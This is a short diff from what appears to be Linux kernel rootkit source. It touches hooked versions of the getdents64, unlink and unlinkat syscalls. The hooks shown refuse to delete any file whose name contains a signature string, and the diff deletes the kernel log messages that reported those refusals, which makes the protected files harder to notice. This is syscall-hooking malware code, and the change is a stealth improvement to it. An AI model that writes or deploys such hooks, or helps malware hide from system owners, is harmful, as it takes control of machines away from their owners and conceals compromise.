@@ -151,7 +151,6 @@ asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 asmlinkage int hooked_unlink(const char *filename) {
 	
 	if(strstr(filename, FILE_SIGNATURE)){
-		printk("The file %s cannot be deleted\n", filename);
 		return -EACCES;
 	}
 	return (*unlink)(filename);
@@ -160,7 +159,6 @@ asmlinkage int hooked_unlink(const char *filename) {
 asmlinkage int hooked_unlinkat(int dirfd, const char *pathname, int flags) {
 	
 	if(strstr(pathname, FILE_SIGNATURE)){
-		printk("The file %s cannot be deleted\n", pathname);
 		return -EACCES;
 	}
 	return (*unlinkat)(dirfd, pathname, flags);
